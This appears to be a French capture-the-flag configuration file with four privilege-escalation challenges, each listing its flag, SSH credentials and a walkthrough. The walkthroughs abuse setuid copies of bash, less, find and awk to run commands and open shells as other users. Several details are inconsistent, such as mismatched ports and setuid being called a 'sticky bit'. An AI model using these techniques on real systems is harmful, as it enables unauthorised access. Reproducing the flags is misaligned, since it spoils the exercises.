#
#
#
#[Challenge_]
#name:  
#value: 10
#category:  
#flag:  
#file:  
#description: 



[Challenge_1]
name: J ai le shell qui colle
value: 10
category: Privilege Escalation
flag: flag001{F1rst_FLAG5_L1v3_F0R3v3R}
description: 
    ```bash
    $ ssh theprofessor@IPSERVER -p PORT
    ```
    Connecte toi au serveur en IPSERVER, sur le port PORT, avec le user 'theprofessor' et le mot de passe 'darko'.

    ```bash
    id
    ```
    Utilise la commande id pour savoir quel est ton userId, et à quels groupes tu appartiens.
    Va faire un tour dans le /home de tokio.
    
    ```
    cd /home/bash
    ls -al find
    ```
    Tu vois ce petit s ? Tokio a laissé trainer l executable du shell bash avec un sticky bit activé. Si tu lances ce shell, il va s executer sous le userId de son propriétaire, tokio.
    
    ```
    ./bash
    ```
    N oublie pas le ./ du bash, pour executer ce binaire et pas celui contenu dans ton $PATH.
    
    ```
    id
    ```
    Qui es tu maintenant ?
    

[Challenge_2]
name: Pas moins 
value: 10
category:  Privilege Escalation
flag:  flag02{l_3sp01r_c_3st_c0mm3_l3s_d0m1n0s}
description: 
     ```bash
    $ ssh tokio@IPSERVER -p 2223
    ```
    Connecte toi au serveur en IPSERVER, sur le port 2223, avec le user 'tokio' et le mot de passe 'esther'.
    ```
    id
    ```
    Regarde quel est ton id
    ```
    cd /home/moscow
    ```
    Va dans le répertoire de moscow
    ```
    ls -al flag02.txt
    cat flag02.txt
    ```
    Essaye de lire son flag.
    ```
    ls -al
    ./less flag02.txt
    ```
    Le binaire less possède un sticky bit. Less est un utilitaire qui permet de lire un fichier et de se déplacer en avant et en arrière. Tu vas pouvoir lire le fichier comme si tu étais moscow.
    Sors du less en tapant 'q'.
    Tu peux ouvrir un shell en tapant '!sh'.
    ```
    id 
    cat flag02.txt
    ```




  
   
[Challenge_3]
name:  Trouvé !
value: 10
category:  Privilege Escalation
flag:  flag03{j3_su1s_un_b1d0n_d_3ss3nc3_av3c_un3_4llum3tt3}
description: 
    ```bash
    $ ssh moscow@IPSERVER -p 2222
    ```
    Connecte toi au serveur en 10.0.0.10, sur le port 2223, avec le user 'moscow' et le mot de passe 'alvaro'.
    
    ```
    id
    ```
    Regarde quel est ton id
    
    ```
    cd /home/rio
    ```
    Va dans le répertoire de rio
    
    ```ls -al flag03.txt
    cat flag03.txt
    ```
    Essaye de lire son flag.
    
    ```
    ls -al
    ./find . -name flags.yml -exec id \\;
    ```Le binaire find possède un sticky bit. Tu vas pouvoir l'utiliser comme si tu étais rio. 
    L'option -exec permet de lancer des commandes shell. Utilise la pour lancer la commande id.
    
    ```
    ./find . -name flags.yml -exec cat {} \\;
    ```
    Lisons le flag.
    
    ```
    ./find . -name flags.yml -exec /bin/bash \\;

    ```
    Et ouvrons un shell.

    ```
    id
    ```


    
    [Challenge_4]
    name:  Une petite histoire du temps
    value: 10
    category:  Privilege Escalation
    flag:  flag04{sup3r_j_4im3_l3s_f3ux_d3_j01e}
    #file:  
    description: 
        ```bash
        $ ssh rio@IPSERVER -p 2222
        ```
        Connecte toi au serveur en IPSERVER, sur le port 2223, avec le user 'rio' et le mot de passe 'paco'.
        
        ```
        id
        ```
        Regarde quel est ton id
        
        ```
        cd /home/berlin
        ```
        Va dans le répertoire de berlin
        
        ```
        ls -al
        ./awk 'BEGIN{system(\"id\")}'
        ```
        Le binaire awk possède un sticky bit. awk est un utilitaire de manipulation de fichier. Tu vas pouvoir l'utiliser comme si tu étais rio. Il permet de lancer des commandes shell. Utilise le pour lancer la commande id.
        
        ```
        ./awk 'BEGIN{system(\"cat flag04.txt\")}'
        ```
        Lisons le flag.
        
        ```
        ./awk 'BEGIN{system(\"/bin/bash\")}'
        ```
        Et ouvrons un shell.
        
        ```
        id
        ```

